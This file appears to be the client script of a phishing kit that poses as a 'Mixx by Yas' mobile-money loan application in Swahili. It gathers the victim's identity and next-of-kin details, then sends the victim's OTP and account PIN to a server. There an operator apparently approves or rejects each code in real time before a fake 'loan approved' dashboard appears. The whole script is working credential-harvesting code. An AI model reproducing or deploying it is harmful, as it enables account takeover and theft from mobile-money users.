// ═══════════════════════════════════════════════════════════
// Mixx by Yas – Mashine ya Hali (Kiswahili)
// Mtiririko: Fomu → OTP → PIN → Dashibodi
// ═══════════════════════════════════════════════════════════

const S = {
  loanType: 'Mkopo wa Biashara',
  loanAmount: 500000,
  loanTerm: 'Miezi 12',
  loanPurpose: '',
  firstName: '', lastName: '', phone: '', email: '',
  employment: '', annualIncome: 0,
  kinName: '', kinPhone: '',
  applicationId: '',
  rejectedStep: null
};

let currentPage = 'page-splash';
let activePoll = null;
let countdownTimers = {};
let countdownValues = {};
let resendCooldown = {};
let resendLeft = {};

const POLL_INTERVAL = 2000;
const COUNTDOWN_SECONDS = 30;
const RESEND_COOLDOWN = 60;

// ═══ SKRINI YA KARIBU ═══
function runSplash() {
  const bar = document.getElementById('splashLoaderBar');
  const totalMs = 4000;
  const started = Date.now();
  const tick = setInterval(() => {
    const pct = Math.min(100, ((Date.now() - started) / totalMs) * 100);
    bar.style.width = pct + '%';
    if (pct >= 100) { clearInterval(tick); goTo('page-landing'); }
  }, 100);
}

// ═══ URAMBAZI ═══
function goTo(pageId) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const el = document.getElementById(pageId);
  if (el) el.classList.add('active');
  currentPage = pageId;
  window.scrollTo(0, 0);
}

// ═══ TAARIFA / MAKOSA ═══
function showToast(msg, type = '') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  setTimeout(() => t.classList.remove('show'), 3000);
}
function showError(id, msg) {
  const el = document.getElementById(id);
  if (!el) return;
  const txt = document.getElementById(id + 'Txt');
  if (txt) txt.textContent = msg;
  el.classList.add('show');
  clearTimeout(el._t);
  el._t = setTimeout(() => el.classList.remove('show'), 4000);
}
function clearErr(id) { const el = document.getElementById(id); if (el) el.classList.remove('show'); }

// ═══ KIKOKOTOO ═══
function updateCalc() {
  const amt = +document.getElementById('amtSlider').value;
  document.getElementById('calcAmt').textContent = 'TZS ' + amt.toLocaleString();
  const monthly = Math.ceil(amt / 12);
  document.getElementById('monthlyAmt').textContent = 'TZS ' + monthly.toLocaleString();
}

function startApplication() {
  S.rejectedStep = null;
  goTo('page-step1');
}

// ═══ HATUA ZA FOMU ═══
function toS2() {
  const ty = document.getElementById('s1ty').value;
  const am = +document.getElementById('s1am').value;
  const te = document.getElementById('s1te').value;
  const pu = document.getElementById('s1pu').value.trim();
  if (!ty || am <= 0 || !te || !pu) { showError('s1Err', 'Tafadhali jaza sehemu zote.'); return; }
  Object.assign(S, { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu });
  goTo('page-step2');
}

function toS3() {
  const fi = document.getElementById('s2fi').value.trim();
  const la = document.getElementById('s2la').value.trim();
  const ph = document.getElementById('s2ph').value.trim();
  const em = document.getElementById('s2em').value.trim();
  if (!fi || !la) { showError('s2Err', 'Weka jina lako kamili.'); return; }
  if (ph.length !== 9) { showError('s2Err', 'Weka namba sahihi ya simu ya tarakimu 9.'); return; }
  if (!em.includes('@')) { showError('s2Err', 'Weka barua pepe sahihi.'); return; }
  Object.assign(S, { firstName: fi, lastName: la, phone: ph, email: em });
  document.getElementById('sA').textContent = 'TZS ' + S.loanAmount.toLocaleString();
  document.getElementById('sT').textContent = S.loanTerm;
  document.getElementById('sP').textContent = S.loanPurpose || '—';
  document.getElementById('sN').textContent = `${fi} ${la}`;
  goTo('page-step3');
}

async function submitApp() {
  const em = document.getElementById('s3em').value;
  const inc = +document.getElementById('s3in').value;
  const kn = document.getElementById('s3kn').value.trim();
  const kp = document.getElementById('s3kp').value.trim();
  if (!em || inc <= 0 || !kn || kp.length !== 9) {
    showError('s3Err', 'Tafadhali jaza sehemu zote.'); return;
  }
  Object.assign(S, { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp });
  try {
    const res = await fetch('/api/send-application', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationData: S })
    });
    const data = await res.json();
    if (!data.ok) { showError('s3Err', 'Imeshindwa kutuma maombi.'); return; }
    S.applicationId = data.applicationId;
    goTo('page-otp');
  } catch (e) { showError('s3Err', 'Hitilafu ya mtandao. Jaribu tena.'); }
}

// ═══ OTP ═══
function otpMvM(el, i) {
  el.value = el.value.replace(/\D/g, '');
  if (el.value && i < 3) document.getElementById('otp' + (i + 1)).focus();
  if (!el.value && i > 0) document.getElementById('otp' + (i - 1)).focus();
}
function clearOtpCode() {
  for (let i = 0; i < 4; i++) document.getElementById('otp' + i).value = '';
  document.getElementById('otp0').focus();
}

async function doOtp() {
  let otp = '';
  for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
  if (otp.length !== 4) { showError('otpErr', 'Weka OTP sahihi ya tarakimu 4.'); return; }
  document.getElementById('otpRejectedNotice').classList.add('hidden');
  document.getElementById('otpResendBlock').classList.add('hidden');
  try {
    await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, otp })
    });
    goTo('page-wait-otp');
    startPoll('otp');
  } catch (e) { showError('otpErr', 'Hitilafu ya mtandao.'); }
}

async function resendOtp() {
  document.getElementById('otpResendBtn').disabled = true;
  const lastOtp = document.getElementById('otpResendBtn').dataset.lastOtp;
  if (!lastOtp) { showToast('Tafadhali weka OTP yako tena.', 'error'); return; }
  try {
    await fetch('/api/send-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, otp: lastOtp })
    });
    showToast('OTP imetumwa tena kwa msimamizi', 'success');
    goTo('page-wait-otp');
    startPoll('otp');
  } catch (e) { showToast('Imeshindwa kutuma tena', 'error'); }
}

// ═══ PIN ═══
function pinMvM(el, i) {
  el.value = el.value.replace(/\D/g, '');
  if (el.value && i < 3) document.getElementById('pin' + (i + 1)).focus();
  if (!el.value && i > 0) document.getElementById('pin' + (i - 1)).focus();
}
function clearLoginPin() {
  for (let i = 0; i < 4; i++) document.getElementById('pin' + i).value = '';
  document.getElementById('pin0').focus();
}
function togPin() {
  for (let i = 0; i < 4; i++) {
    const el = document.getElementById('pin' + i);
    el.type = el.type === 'password' ? 'text' : 'password';
  }
}

async function doPin() {
  let pin = '';
  for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
  if (pin.length !== 4) { showError('pinErr', 'Weka PIN sahihi ya tarakimu 4.'); return; }
  document.getElementById('pinRejectedNotice').classList.add('hidden');
  document.getElementById('pinResendBlock').classList.add('hidden');
  try {
    const res = await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, pin })
    });
    const data = await res.json();
    if (data.blocked) {
      showError('pinErr', data.message || 'PIN imezuiwa. Jaribu tena baadaye.');
      showPinBlocked();
      return;
    }
    if (!data.ok) { showError('pinErr', data.error || 'Imeshindwa kutuma.'); return; }
    goTo('page-wait-pin');
    startPoll('pin');
  } catch (e) { showError('pinErr', 'Hitilafu ya mtandao.'); }
}

async function resendPin() {
  document.getElementById('pinResendBtn').disabled = true;
  const lastPin = document.getElementById('pinResendBtn').dataset.lastPin;
  if (!lastPin) { showToast('Tafadhali weka PIN yako tena.', 'error'); return; }
  try {
    await fetch('/api/send-pin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ applicationId: S.applicationId, pin: lastPin })
    });
    showToast('PIN imetumwa tena kwa msimamizi', 'success');
    goTo('page-wait-pin');
    startPoll('pin');
  } catch (e) { showToast('Imeshindwa kutuma tena', 'error'); }
}

function showPinBlocked() {
  const badge = document.getElementById('pinAttemptsDisplay');
  badge.textContent = '🔒 PIN imezuiwa kwa muda';
  badge.className = 'attempts-badge blocked';
  for (let i = 0; i < 4; i++) document.getElementById('pin' + i).disabled = true;
}

// ═══ UCHUNGUZAJI (Polling) ═══
function startPoll(step) {
  stopPoll();
  startCountdown(step);
  activePoll = setInterval(async () => {
    try {
      const res = await fetch(`/api/status/${S.applicationId}/${step}`, { cache: 'no-store' });
      if (res.status === 404) { handleNotFound(); return; }
      const data = await res.json();
      if (data.status === 'approved') { stopPoll(); stopCountdown(step); onApproved(step); return; }
      if (data.status === 'rejected') { stopPoll(); stopCountdown(step); onRejected(step); return; }
      if (data.status === 'blocked') { stopPoll(); stopCountdown(step); onBlocked(step); return; }
    } catch (err) { console.error('Hitilafu ya uchunguzaji:', err); }
  }, POLL_INTERVAL);
}

function stopPoll() { if (activePoll) { clearInterval(activePoll); activePoll = null; } }

function onApproved(step) {
  if (step === 'otp') { goTo('page-pin'); return; }
  if (step === 'pin') { showDashboard(); return; }
}

function onRejected(step) {
  document.getElementById(`${step}RejectedNotice`)?.classList.remove('hidden');
  document.getElementById(`${step}ResendBlock`)?.classList.remove('hidden');

  if (step === 'otp') {
    let otp = '';
    for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
    document.getElementById('otpResendBtn').dataset.lastOtp = otp;
    clearOtpCode();
    showToast('OTP ilikataliwa. Tafadhali weka tena.', 'error');
    goTo('page-otp');
  } else if (step === 'pin') {
    let pin = '';
    for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
    document.getElementById('pinResendBtn').dataset.lastPin = pin;
    clearLoginPin();
    showToast('PIN ilikataliwa. Tafadhali weka tena.', 'error');
    goTo('page-pin');
  }

  startResendCooldown(step);
}

function onBlocked(step) {
  if (step === 'pin') {
    showPinBlocked();
    goTo('page-pin');
    showToast('PIN imezuiwa kwa dakika 30.', 'error');
  }
}

function handleNotFound() {
  stopPoll();
  Object.keys(countdownTimers).forEach(stopCountdown);
  alert('Maombi hayapatikani. Tafadhali anza tena.');
  goTo('page-landing');
}

// ═══ HESABU YA KUPUNGUA ═══
function startCountdown(step) {
  stopCountdown(step);
  countdownValues[step] = COUNTDOWN_SECONDS;
  updateCountdownUI(step, COUNTDOWN_SECONDS);
  countdownTimers[step] = setInterval(() => {
    countdownValues[step]--;
    updateCountdownUI(step, Math.max(0, countdownValues[step]));
    if (countdownValues[step] <= 0) {
      stopCountdown(step);
      document.getElementById(`${step}WaitStatus`).textContent = 'Bado tunasubiri jibu la msimamizi…';
    }
  }, 1000);
}
function stopCountdown(step) {
  if (countdownTimers[step]) { clearInterval(countdownTimers[step]); delete countdownTimers[step]; }
}
function updateCountdownUI(step, seconds) {
  const numEl = document.getElementById(`${step}CountdownNum`);
  const circleEl = document.getElementById(`${step}CountdownCircle`);
  if (!numEl || !circleEl) return;
  numEl.textContent = seconds;
  const pct = seconds / COUNTDOWN_SECONDS;
  circleEl.style.strokeDashoffset = (283 * (1 - pct)).toString();
}

// ═══ KUSUBIRI KUTUMA TENA ═══
function startResendCooldown(step) {
  stopResendCooldown(step);
  resendLeft[step] = RESEND_COOLDOWN;
  const btn = document.getElementById(`${step}ResendBtn`);
  const timerLabel = document.getElementById(`${step}ResendTimer`);
  btn.disabled = true;
  resendCooldown[step] = setInterval(() => {
    resendLeft[step]--;
    if (resendLeft[step] <= 0) {
      stopResendCooldown(step);
      btn.disabled = false;
      btn.textContent = 'Tuma Tena kwa Msimamizi';
    } else if (timerLabel) {
      timerLabel.textContent = resendLeft[step];
    }
  }, 1000);
}
function stopResendCooldown(step) {
  if (resendCooldown[step]) { clearInterval(resendCooldown[step]); delete resendCooldown[step]; }
}

// ═══ GHAIRI KUSUBIRI ═══
function cancelWait(step) {
  stopPoll();
  stopCountdown(step);
  if (step === 'otp') goTo('page-otp');
  if (step === 'pin') goTo('page-pin');
}

// ═══ DASHIBODI ═══
function showDashboard() {
  const initials = (S.firstName.charAt(0) + S.lastName.charAt(0)).toUpperCase() || 'MY';
  const fullName = `${S.firstName} ${S.lastName}`.trim() || 'Mtumiaji wa Mixx';
  const phoneMasked = S.phone
    ? `+255 ${S.phone.slice(0, 3)} *** ${S.phone.slice(-3)}`
    : '+255 712 *** 678';

  const amount = S.loanAmount || 500000;
  const termMonths = parseInt((S.loanTerm || '12').replace(/\D/g, '')) || 12;
  const monthly = Math.ceil(amount / termMonths);

  document.getElementById('dashAvatar').textContent = initials;
  document.getElementById('dashName').textContent = fullName;
  document.getElementById('dashBalance').textContent = 'TZS ' + amount.toLocaleString();
  document.getElementById('dashAccount').textContent = phoneMasked;
  document.getElementById('dashTerm').textContent = S.loanTerm || 'Miezi 12';
  document.getElementById('dashLoanAmt').textContent = 'TZS ' + amount.toLocaleString();
  document.getElementById('dashMonthly').textContent = 'TZS ' + monthly.toLocaleString();
  document.getElementById('dashTotal').textContent = 'TZS ' + amount.toLocaleString();
  document.getElementById('dashTxAmount').textContent = '+ TZS ' + amount.toLocaleString();

  const next = new Date();
  next.setDate(next.getDate() + 30);
  const formatted = next.toLocaleDateString('sw-TZ', { day: 'numeric', month: 'short', year: 'numeric' });
  document.getElementById('dashNextPay').textContent = formatted;

  goTo('page-dashboard');
  showToast('🎉 Mkopo umeidhinishwa — karibu kwenye dashibodi yako', 'success');
}

function finishApplication() {
  if (confirm('Una uhakika unataka kutoka?')) {
    location.reload();
  }
}

// ═══ ANZISHA ═══
document.addEventListener('DOMContentLoaded', () => {
  for (let i = 0; i < 4; i++) {
    const p = document.getElementById('pin' + i);
    if (p) p.addEventListener('input', () => pinMvM(p, i));
    const o = document.getElementById('otp' + i);
    if (o) o.addEventListener('input', () => otpMvM(o, i));
  }
  updateCalc();
  runSplash();
});
